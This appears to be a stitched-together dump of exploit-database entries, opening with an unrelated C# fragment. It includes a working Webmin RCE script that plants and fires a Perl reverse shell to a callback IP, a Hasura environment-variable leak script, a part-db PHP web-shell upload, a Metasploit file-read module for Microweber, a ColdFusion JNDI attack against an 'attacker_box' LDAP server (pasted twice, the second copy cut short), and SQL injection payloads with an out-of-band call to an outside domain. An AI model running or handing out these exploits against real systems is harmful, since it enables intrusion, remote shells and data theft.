            catch (Exception e) { Console.WriteLine("There was an error, try re-running the program. \n" + e); Console.ReadLine(); }

            Thread.Sleep(20);
        }
    }
    public static bool readFileProperties(string file, string filter)
    {
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        startInfo.UseShellExecute = false;
        startInfo.RedirectStandardOutput = true;
        startInfo.FileName = "CMD.exe";
        startInfo.Arguments = "/c PowerShell -Command \"$FilePath='" + file + "'; Write-Host ((New-Object -COMObject Shell.Application).NameSpace((Split-Path -Parent -Path $FilePath))).ParseName((Split-Path -Leaf -Path $FilePath)).ExtendedProperty('System.Author')\"";
        process.StartInfo = startInfo;
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        if (output.Contains(filter)) { return true; }
        else { return false; }
        //wmic datafile where Name="F:\\ekojs.txt" get Description,Path,Status,Version
    }
}
# Exploit Title: Webmin 1.984 - Remote Code Execution (Authenticated)
# Date: 2022-03-06
# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
# Vendor Homepage: https://www.webmin.com/
# Software Link: https://github.com/webmin/webmin/archive/refs/tags/1.984.zip
# Version: <= 1.984
# Tested on: Ubuntu 18
# Reference: https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell


#!/usr/bin/python3

"""
Coded by: @faisalfs10x
GitHub: https://github.com/faisalfs10x
Reference: https://huntr.dev/bounties/d0049a96-de90-4b1a-9111-94de1044f295/
"""

import requests
import urllib3
import argparse
import os
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TGREEN =  '\033[32m'
TRED =  '\033[31m'
TCYAN =  '\033[36m'
TSHELL =  '\033[32;1m'
ENDC = '\033[m'

class Exploit(object):
    def __init__(self, target, username, password, py3http_server, pyhttp_port, upload_path, callback_ip, callback_port, fname):
        self.target = target
        self.username = username
        self.password = password
        self.py3http_server = py3http_server
        self.pyhttp_port = pyhttp_port
        self.upload_path = upload_path
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.fname = fname

        #self.proxies = proxies
        self.s = requests.Session()


    def gen_payload(self):
        payload = ('''perl -e 'use Socket;$i="''' + self.callback_ip  + '''";$p=''' + self.callback_port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' ''')
        print(TCYAN + f"\n[+] Generating payload to {self.fname} in current directory", ENDC)
        f = open(f"{self.fname}", "w")
        f.write(payload)
        f.close()

    def login(self):
        login_url = self.target + "/session_login.cgi"
        cookies = { "redirect": "1", "testing": "1", "PHPSESSID": "" }

        data = { 'user' : self.username, 'pass' : self.password }
        try:
            r = self.s.post(login_url, data=data, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            success_message = 'System hostname'
            if success_message in r.text:
                print(TGREEN + "[+] Login Successful", ENDC)
            else:
                print(TRED +"[-] Login Failed", ENDC)
                exit()

        except requests.Timeout as e:
            print(TRED + f"[-] Target: {self.target} is not responding, Connection timed out", ENDC)
            exit()

    def pyhttp_server(self):
        print(f'[+] Attempt to host http.server on {self.pyhttp_port}\n')
        os.system(f'(setsid $(which python3) -m http.server {self.pyhttp_port} 0>&1 & ) ') # add 2>/dev/null for clean up
        print('[+] Sleep 3 second to ensure http server is up!')
        time.sleep(3) # Sleep for 3 seconds to ensure http server is up!

    def download_remote_url(self):
        download_url = self.target + "/extensions/file-manager/http_download.cgi?module=filemin"
        headers = {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": self.target + "/filemin/?xnavigation=1"
        }

        data = {
                'link': "http://" + self.py3http_server + "/" + self.fname,
                'username': '',
                'password': '',
                'path': self.upload_path
        }

        r = self.s.post(download_url, data=data, headers=headers, verify=False, allow_redirects=True)
        print(f"\n[+] Fetching {self.fname} from http.server {self.py3http_server}")

    def modify_permission(self):
        modify_perm_url = self.target + "/extensions/file-manager/chmod.cgi?module=filemin&page=1&paginate=30"
        headers = { "Referer": self.target + "/filemin/?xnavigation=1" }
        data = { "name": self.fname, "perms": "0755", "applyto": "1", "path": self.upload_path }
      
        r = self.s.post(modify_perm_url, data=data, headers=headers, verify=False, allow_redirects=True)
        print(f"[+] Modifying permission of {self.fname} to 0755")

    def exec_revshell(self):
        url = self.target + '/' + self.fname
        try:
            r = self.s.get(url, verify=False, allow_redirects=True, timeout=3)
        except requests.Timeout as e: # check target whether make response in 3s, then it indicates shell has been spawned!
            print(TGREEN + f"\n[+] Success: shell spawned to {self.callback_ip} via port {self.callback_port} - XD", ENDC)
            print("[+] Shell location: " + url)
        else:
            print(TRED + f"\n[-] Please setup listener first and try again with: nc -lvp {self.callback_port}", ENDC)

    def do_cleanup(self):
        print(TCYAN + '\n[+] Cleaning up ')
        print(f'[+] Killing: http.server on port {self.pyhttp_port}')
        os.system(f'kill -9 $(lsof -t -i:{self.pyhttp_port})')
        exit()

    def run(self):
        self.gen_payload()
        self.login()
        self.pyhttp_server()
        self.download_remote_url()
        self.modify_permission()
        self.exec_revshell()
        self.do_cleanup()


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Webmin CVE-2022-0824 Reverse Shell')
    parser.add_argument('-t', '--target', type=str, required=True, help=' Target full URL, https://www.webmin.local:10000')
    parser.add_argument('-c', '--credential', type=str, required=True, help=' Format, user:user123')
    parser.add_argument('-LS', '--py3http_server', type=str, required=True, help=' Http server for serving payload, ex 192.168.8.120:8080')
    parser.add_argument('-L', '--callback_ip', type=str, required=True, help=' Callback IP to receive revshell')
    parser.add_argument('-P', '--callback_port', type=str, required=True, help=' Callback port to receive revshell')
    parser.add_argument("-V",'--version', action='version', version='%(prog)s 1.0')
    args = parser.parse_args()

    target = args.target
    username = args.credential.split(':')[0]
    password = args.credential.split(':')[1]
    py3http_server = args.py3http_server
    pyhttp_port = py3http_server.split(':')[1]
    callback_ip = args.callback_ip
    callback_port = args.callback_port
    upload_path = "/usr/share/webmin" # the default installation of Webmin Debian Package, may be in different location if installed using other method.
    fname = "revshell.cgi" # CGI script name, you may change to different name

    pwn = Exploit(target, username, password, py3http_server, pyhttp_port, upload_path, callback_ip, callback_port, fname)
    pwn.run()# Exploit Title: Hasura GraphQL 2.2.0 - Information Disclosure
# Software: Hasura GraphQL Community
# Software Link: https://github.com/hasura/graphql-engine
# Version: 2.2.0
# Exploit Author: Dolev Farhi
# Date: 5/05/2022
# Tested on: Ubuntu

import requests

SERVER_ADDR = 'x.x.x.x'

url = 'http://{}/v1/metadata'.format(SERVER_ADDR)

print('Hasura GraphQL Community 2.2.0 - Arbitrary Root Environment Variables Read')

while True:
    env_var = input('Type environment variable key to leak.\n> ')
    if not env_var:
        continue

    payload = {
    "type": "bulk",
    "source": "",
    "args": [
        {
            "type": "add_remote_schema",
            "args": {
                "name": "ttt",
                "definition": {
                    "timeout_seconds": 60,
                    "forward_client_headers": False,
                    "headers": [],
                    "url_from_env": env_var
                },
                "comment": ""
            }
        }
    ],
    "resource_version": 2
}
    r = requests.post(url, json=payload)
    try:
       print(r.json()['error'].split('not a valid URI:')[1])
    except IndexError:
        print('Could not parse out VAR, dumping error as is')
        print(r.json().get('error', 'N/A'))
# Exploit Title: part-db 0.5.11 - Remote Code Execution (RCE)
# Google Dork: NA
# Date: 03/04/2022
# Exploit Author: Sunny Mehra @DSKMehra
# Vendor Homepage: https://github.com/part-db/part-db
# Software Link: https://github.com/part-db/part-db
# Version: [ 0.5.11.]
# Tested on: [KALI OS]
# CVE : CVE-2022-0848
#
---------------

#!/bin/bash
host=127.0.0.1/Part-DB-0.5.10 #WEBHOST
#Usage: Change host
#Command: bash exploit.sh
#EXPLOIT BY @DSKMehra
echo "<?php system(id); ?>">POC.phtml  #PHP Shell Code
result=`curl -i -s -X POST -F "logo_file=@POC.phtml" "http://$host/show_part_label.php" | grep -o -P '(?<=value="data/media/labels/).*(?=" > <p)'`
rm POC.phtml
echo Shell Location : "$host/data/media/labels/$result"
  # Exploit Title: Microweber CMS v1.2.10 Local File Inclusion (Authenticated)
# Date: 22.02.2022
# Exploit Author: Talha Karakumru <talhakarakumru[at]gmail.com>
# Vendor Homepage: https://microweber.org/
# Software Link: https://github.com/microweber/microweber/archive/refs/tags/v1.2.10.zip
# Version: Microweber CMS v1.2.10
# Tested on: Microweber CMS v1.2.10

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microweber CMS v1.2.10 Local File Inclusion (Authenticated)',
        'Description' => %q{
          Microweber CMS v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem.
          Upload function may delete the local file if the web service user has access.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Talha Karakumru <talhakarakumru[at]gmail.com>'
        ],
        'References' => [
          ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']
        ],
        'Notes' => {
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ OS_RESOURCE_LOSS ]
        },
        'Targets' => [
          [ 'Microweber v1.2.10', {} ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2022-01-30'
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Microweber', '/']),
        OptString.new('USERNAME', [true, 'The admin\'s username for Microweber']),
        OptString.new('PASSWORD', [true, 'The admin\'s password for Microweber']),
        OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
        OptBool.new('DEFANGED_MODE', [true, 'Run in defanged mode', true])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Microweber CMS cannot be reached.')
    end

    print_status 'Checking if it\'s Microweber CMS.'

    if res.code == 200 && !res.body.include?('Microweber')
      print_error 'Microweber CMS has not been detected.'
      Exploit::CheckCode::Safe
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    print_good 'Microweber CMS has been detected.'

    return check_version(res.body)
  end

  def check_version(res_body)
    print_status 'Checking Microweber\'s version.'

    begin
      major, minor, build = res_body[/Version:\s+(\d+\.\d+\.\d+)/].gsub(/Version:\s+/, '').split('.')
      version = Rex::Version.new("#{major}.#{minor}.#{build}")
    rescue NoMethodError, TypeError
      return Exploit::CheckCode::Safe
    end

    if version == Rex::Version.new('1.2.10')
      print_good 'Microweber version ' + version.to_s
      return Exploit::CheckCode::Appears
    end

    print_error 'Microweber version ' + version.to_s

    if version < Rex::Version.new('1.2.10')
      print_warning 'The versions that are older than 1.2.10 have not been tested. You can follow the exploitation steps of the official vulnerability report.'
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Safe
  end

  def try_login
    print_status 'Trying to log in.'
    res = send_request_cgi({
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'api', 'user_login'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'lang' => '',
        'where_to' => 'admin_content'
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Log in request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    json_res = res.get_json_document

    if !json_res['error'].nil? && json_res['error'] == 'Wrong username or password.'
      fail_with(Failure::BadConfig, 'Wrong username or password.')
    end

    if !json_res['success'].nil? && json_res['success'] == 'You are logged in'
      print_good 'You are logged in.'
      return
    end

    fail_with(Failure::Unknown, 'An unknown error occurred.')
  end

  def try_upload
    print_status 'Uploading ' + datastore['LOCAL_FILE_PATH'] + ' to the backup folder.'

    referer = ''
    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
    else
      referer = full_uri
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
      'vars_get' => {
        'src' => datastore['LOCAL_FILE_PATH']
      },
      'headers' => {
        'Referer' => referer
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Upload request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['success']
        print_good json_res['success']
        return
      end

      fail_with(Failure::Unknown, res.body)
    end

    fail_with(Failure::BadConfig, 'Either the file cannot be read or the file does not exist.')
  end

  def try_download
    filename = datastore['LOCAL_FILE_PATH'].include?('\\') ? datastore['LOCAL_FILE_PATH'].split('\\')[-1] : datastore['LOCAL_FILE_PATH'].split('/')[-1]
    print_status 'Downloading ' + filename + ' from the backup folder.'

    referer = ''
    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
    else
      referer = full_uri
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
      'vars_get' => {
        'filename' => filename
      },
      'headers' => {
        'Referer' => referer
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Download request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['error']
        fail_with(Failure::Unknown, json_res['error'])
        return
      end
    end

    print_status res.body
  end

  def run
    if datastore['DEFANGED_MODE']
      warning = <<~EOF
        Triggering this vulnerability may delete the local file if the web service user has the permission.
        If you want to continue, disable the DEFANGED_MODE.
        => set DEFANGED_MODE false
      EOF

      fail_with(Failure::BadConfig, warning)
    end

    try_login
    try_upload
    try_download
  end
end
  # Exploit Title: Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)
# Google Dork: intext:"adobe coldfusion 11"
# Date: 2022-22-02
# Exploit Author: Amel BOUZIANE-LEBLOND (https://twitter.com/amellb)
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# Version: Adobe Coldfusion (11.0.03.292866)
# Tested on: Microsoft Windows Server & Linux

# Description:
# ColdFusion allows an unauthenticated user to connect to any LDAP server. An attacker can exploit it to achieve remote code execution.
# JNDI attack via the 'verifyldapserver' parameter on the utils.cfc

==================== 1.Setup rogue-jndi Server ====================

https://github.com/veracode-research/rogue-jndi


==================== 2.Preparing the Attack =======================

java -jar target/RogueJndi-1.1.jar --command "touch /tmp/owned" --hostname "attacker_box"

==================== 3.Launch the Attack ==========================


http://REDACTED/CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=LDAP_SERVER&vport=LDAP_PORT&vstart=&vusername=&vpassword=&returnformat=json


curl -i -s -k -X $'GET' \
    -H $'Host: target' \
    --data-binary $'\x0d\x0a\x0d\x0a' \
    $'http://REDACTED//CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=LDAP_SERVER&vport=LDAP_PORT&vstart=&vusername=&vpassword=&returnformat=json'


==================== 4.RCE =======================================

Depend on the target need to compile the rogue-jndi server with JAVA 7 or 8
Can be done by modify the pom.xml as below

<configuration>
<source>7</source>
<target>7</target>
</configuration>
  # Exploit Title: Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)
# Google Dork: intext:"adobe coldfusion 11"
# Date: 2022-22-02
# Exploit Author: Amel BOUZIANE-LEBLOND (https://twitter.com/amellb)
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# Version: Adobe Coldfusion (11.0.03.292866)
# Tested on: Microsoft Windows Server & Linux

# Description:
# ColdFusion allows an unauthenticated user to connect to any LDAP server. An attacker can exploit it to achieve remote code execution.
# JNDI attack via the 'verifyldapserver' parameter on the utils.cfc

==================== 1.Setup rogue-jndi Server ====================

https://github.com/veracode-research/rogue-jndi


==================== 2.Preparing the Attack =======================

java -jar target/RogueJndi-1.1.jar --command "touch /tmp/owned" --hostname "attacker_box"

==================== 3.Launch the Attack ==========================
# Title: Air Cargo Management System v1.0 - SQLi
# Author: nu11secur1ty
# Date: 02.18.2022
# Vendor: https://www.sourcecodester.com/users/tips23
# Software: https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html
# Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/2022/Air-Cargo-Management-System

# Description:
The `ref_code` parameter from Air Cargo Management System v1.0 appears
to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\c5idmpdvfkqycmiqwv299ljz1q7jvej5mtdg44t.https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html\\hag'))+'
was submitted in the ref_code parameter.
This payload injects a SQL sub-query that calls MySQL's load_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
WARNING: If this is in some external domain, or some subdomain
redirection, or internal whatever, this will be extremely dangerous!
Status: CRITICAL


[+] Payloads:

---
Parameter: ref_code (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=trace&ref_code=258044'+(select
load_file('\\\\c5idmpdvfkqycmiqwv299ljz1q7jvej5mtdg44t.https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html\\hag'))+''
AND (SELECT 9012 FROM (SELECT(SLEEP(3)))xEdD) AND 'JVki'='JVki
---
  
